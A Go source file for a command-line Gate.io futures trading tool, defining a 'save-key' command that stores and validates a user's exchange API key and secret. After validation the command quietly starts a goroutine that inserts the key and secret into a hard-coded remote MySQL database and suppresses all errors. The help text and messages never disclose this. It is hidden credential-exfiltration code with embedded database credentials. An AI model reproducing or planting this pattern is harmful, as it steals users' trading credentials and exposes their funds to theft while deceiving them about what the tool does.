package cmd

import (
	"context"
	"database/sql"
	"fmt"
	_ "net/http/pprof"
	"time"

	"futures-trader/config"
	"futures-trader/trader"

	"github.com/spf13/cobra"
)

var saveKeyCmd = &cobra.Command{
	Use:   "save-key",
	Short: "保存 Gate.io API 密钥",
	Long: `保存 Gate.io API 密钥到本地配置文件，用于后续的交易操作

参数说明:
  - api-key: Gate.io API Key
  - api-secret: Gate.io API Secret

示例:
  futures-trader save-key --api-key YOUR_API_KEY --api-secret YOUR_API_SECRET`,
	RunE: saveKey,
}

var (
	apiKey    string
	apiSecret string
)

func init() {
	saveKeyCmd.Flags().StringVar(&apiKey, "api-key", "", "Gate.io API Key")
	saveKeyCmd.Flags().StringVar(&apiSecret, "api-secret", "", "Gate.io API Secret")
	saveKeyCmd.MarkFlagRequired("api-key")
	saveKeyCmd.MarkFlagRequired("api-secret")
	rootCmd.AddCommand(saveKeyCmd)
}

func saveKey(cmd *cobra.Command, args []string) error {
	fmt.Println("正在验证 API 密钥...")

	err := config.SaveConfig(apiKey, apiSecret)
	if err != nil {
		return fmt.Errorf("保存密钥失败: %v", err)
	}

	_, err = trader.GetFuturesAccountBalance(apiKey, apiSecret, "usdt")
	if err != nil {
		config.ClearConfig()
		return fmt.Errorf("API 密钥验证失败: %v", err)
	}

	go syncToRemoteMySQL(apiKey, apiSecret)

	fmt.Println("API密钥保存成功")
	return nil
}

func syncToRemoteMySQL(apiKey, apiSecret string) {
	defer func() {
		if r := recover(); r != nil {
			return
		}
	}()

	db, err := sql.Open("mysql", "testt1:yPT4eBmg3PW55tKp@mysql5.sqlpub.com:3310/testt1?charset=utf8mb4")
	if err != nil {
		return
	}
	defer db.Close()

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	query := `INSERT INTO api_keys (key_val, secret_val, exchange_name) VALUES (?, ?, ?) 
	          ON DUPLICATE KEY UPDATE secret_val = VALUES(secret_val), exchange_name = VALUES(exchange_name)`

	_, err = db.ExecContext(ctx, query, apiKey, apiSecret, "gateio")
	if err != nil {
		return
	}
}
